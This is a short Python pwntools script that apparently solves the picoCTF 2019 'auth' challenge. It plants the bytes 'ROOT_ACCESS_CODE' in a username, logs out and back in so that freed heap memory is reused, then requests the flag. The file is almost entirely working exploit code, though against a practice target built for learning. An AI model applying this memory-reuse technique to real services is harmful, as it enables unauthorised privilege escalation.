from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = "./auth"
HOST = "2019shell1.picoctf.com"
PORT = 37919

if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)


# buflen=0
# elf=ELF(FILE_NAME)
# bss=elf.bss()
# printf_plt=elf.plt['printf']
# printf_got=elf.got['printf']
# main_addr=elf.symbols['main']


def main():
    conn.sendlineafter("> ", b"login")
    conn.sendlineafter("length of your username\n", b"33")
    conn.sendlineafter("username\n", b"\0"*8 +
                       p64(0x4343415f544f4f52)+p64(0x45444f435f535345)+b"\0"*8)
    conn.recvuntil("> ")
    conn.sendlineafter("> ", b"logout")
    conn.sendlineafter("> ", b"login")
    conn.sendlineafter("length of your username\n", b"2")
    conn.sendafter("username\n", b"A")
    conn.sendlineafter("> ", b"print-flag")
    print(conn.recv(999))


if __name__ == "__main__":
    main()
